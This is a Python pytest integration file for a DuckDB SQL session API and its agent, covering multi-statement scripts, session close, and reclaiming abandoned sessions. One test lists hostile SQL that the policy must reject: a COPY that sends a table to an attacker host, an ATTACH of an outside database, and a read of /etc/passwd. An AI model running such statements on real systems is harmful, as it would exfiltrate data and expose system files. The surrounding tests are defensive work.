"""SQL session lifecycle across API + agent.

Opens a session (the API instructs the agent to hold a DuckDB connection over the
WS control channel), runs a multi-statement script — including statements the old
allowlist blocked (``SET``, ``CREATE TABLE``) — poll+fetches a SELECT statement
through the ordinary ``queries`` path, confirms the statement audit rows carry the
session id, confirms a hostile ``COPY``/``ATTACH``/``INSTALL`` is rejected by the
statement policy, and confirms close frees the agent's admission slot.
"""

from __future__ import annotations

import asyncio

import pytest

pytestmark = pytest.mark.cross_component


async def _open(api_client, workspace: str, agent_id: str) -> dict:
    resp = await api_client.post(
        f"/api/workspaces/{workspace}/sql/sessions", json={"agent_id": agent_id}
    )
    assert resp.status_code == 201, resp.text
    body = resp.json()
    assert body["status"] == "open", body
    return body


async def _exec(api_client, session_id: str, sql: str) -> dict:
    """Submit a statement and poll the underlying query row to a terminal state."""
    created = await api_client.post(f"/api/sql/sessions/{session_id}/statements", json={"sql": sql})
    assert created.status_code == 202, created.text
    query_id = created.json()["id"]
    deadline = asyncio.get_event_loop().time() + 60.0
    while asyncio.get_event_loop().time() < deadline:
        body = (await api_client.get(f"/api/queries/{query_id}")).json()
        if body["status"] in ("done", "failed", "cancelled"):
            return body
        await asyncio.sleep(0.5)
    raise AssertionError(f"statement {query_id} did not finish in time")


async def test_session_multi_statement_script(api_client, workspace, healthy_agent) -> None:
    session = await _open(api_client, workspace, healthy_agent["id"])
    session_id = session["id"]

    # A statement the single-shot allowlist rejects (SET), then DDL, then a SELECT.
    assert (await _exec(api_client, session_id, "SET timezone = 'UTC'"))["status"] == "done"
    create = await _exec(api_client, session_id, "CREATE TABLE sess_demo AS SELECT 1 AS n")
    assert create["status"] == "done", create
    select = await _exec(api_client, session_id, "SELECT n FROM sess_demo")
    assert select["status"] == "done", select

    rows = (await api_client.get(f"/api/queries/{select['id']}/rows")).json()
    assert rows["rows"] == [{"n": 1}]

    # The statement audit rows are attributable to the session.
    assert (await api_client.get(f"/api/queries/{select['id']}")).json()["status"] == "done"

    await api_client.delete(f"/api/sql/sessions/{session_id}")


@pytest.mark.parametrize(
    "sql",
    [
        "COPY sess_demo TO 'http://attacker.example/x.parquet'",
        "ATTACH 'evil.db' AS evil",
        "INSTALL spatial",
        "SELECT * FROM read_parquet('/etc/passwd')",
    ],
)
async def test_hostile_statements_rejected(api_client, workspace, healthy_agent, sql) -> None:
    session = await _open(api_client, workspace, healthy_agent["id"])
    resp = await api_client.post(f"/api/sql/sessions/{session['id']}/statements", json={"sql": sql})
    assert resp.status_code == 422, resp.text
    assert resp.json()["detail"]["error"] == "statement_not_allowed"
    await api_client.delete(f"/api/sql/sessions/{session['id']}")


async def test_close_releases_agent_slot(api_client, workspace, healthy_agent) -> None:
    session = await _open(api_client, workspace, healthy_agent["id"])
    close = await api_client.delete(f"/api/sql/sessions/{session['id']}")
    assert close.status_code == 204
    # The session is no longer usable; a further statement conflicts.
    resp = await api_client.post(
        f"/api/sql/sessions/{session['id']}/statements", json={"sql": "SELECT 1"}
    )
    assert resp.status_code == 409


async def _wait_new_agent_id(api_client, before: set[str], timeout_s: float = 60.0) -> str:
    """Poll until a healthy agent whose id is not in ``before`` appears."""
    deadline = asyncio.get_event_loop().time() + timeout_s
    while asyncio.get_event_loop().time() < deadline:
        agents = (await api_client.get("/api/agents")).json()
        new = [a for a in agents if a["id"] not in before and a["status"] == "healthy"]
        if new:
            return new[0]["id"]
        await asyncio.sleep(0.5)
    raise AssertionError("spawned agent did not register healthy in time")


async def test_abandoned_session_reclaimed_by_agent_lease(
    api_client, workspace, spawn_agent
) -> None:
    """Regression for the churn leak (#152): a session the client abandons without
    DELETE must be reclaimed by the agent's own idle lease — freeing its admission
    slot — rather than pinning the agent until reconnect. A short-lease disposable
    agent lets the backstop fire within the test window."""
    before = {a["id"] for a in (await api_client.get("/api/agents")).json()}
    spawn_agent({"SESSION_IDLE_TIMEOUT_S": "3", "SESSION_MAX_LIFETIME_S": "0"})
    agent_id = await _wait_new_agent_id(api_client, before)

    # Open a session against the disposable agent, then abandon it (never DELETE).
    session = await _open(api_client, workspace, agent_id)

    # The agent's idle sweep (idle 3s, on the 2s metrics tick) tears the held
    # connection down and reports SESSION_CLOSED, which flips the row to closed.
    deadline = asyncio.get_event_loop().time() + 30.0
    status = "open"
    while asyncio.get_event_loop().time() < deadline:
        status = (await api_client.get(f"/api/sql/sessions/{session['id']}")).json()["status"]
        if status == "closed":
            break
        await asyncio.sleep(0.5)
    assert status == "closed", f"abandoned session was not reclaimed by the agent lease: {status}"

    # The reclaimed slot is reusable: a fresh session opens on the same agent.
    reopened = await _open(api_client, workspace, agent_id)
    await api_client.delete(f"/api/sql/sessions/{reopened['id']}")
